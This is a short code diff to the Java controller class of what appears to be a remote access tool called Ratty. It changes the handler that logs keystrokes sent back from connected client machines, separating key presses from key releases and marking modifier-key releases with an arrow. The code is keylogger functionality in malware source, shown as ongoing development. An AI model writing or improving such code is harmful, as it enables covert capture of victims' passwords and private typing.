@@ -174,6 +174,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String SEPARATOR = "/";
 	private static final long PING_INTERVAL = 5000;
 	private static final long NOTIFICATION_DELAY = 7500;
+	private static final String ARROW_CHARACTER = "\u2191";
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -903,15 +904,21 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private void handleKeylog(final ServerClient client, final KeylogPacket packet) {
 		final int keyCode = packet.getKeyCode();
-		final String message = NativeKeyEvent.getKeyText(keyCode);
+		final boolean pressed = packet.getFlag() == KeylogPacket.PRESSED;
 		
-		if (message.length() == 1) {
-			client.logger.log(message);
-		} else {
-			final String modifierMessage = String.format(KEY_MODIFIER_TEXT_FORMAT, message);
+		String message = NativeKeyEvent.getKeyText(keyCode);
+		
+		if (message.length() > 1) {
+			if (!pressed) {
+				message += ARROW_CHARACTER;
+			}
 			
-			client.logger.log(modifierMessage);
+			message = String.format(KEY_MODIFIER_TEXT_FORMAT, message);
+		} else if (!pressed) {
+			return;
 		}
+		
+		client.logger.log(message);
 	}
 	
 	private void handleRoots(final ServerClient client, final RootRequestPacket packet) {
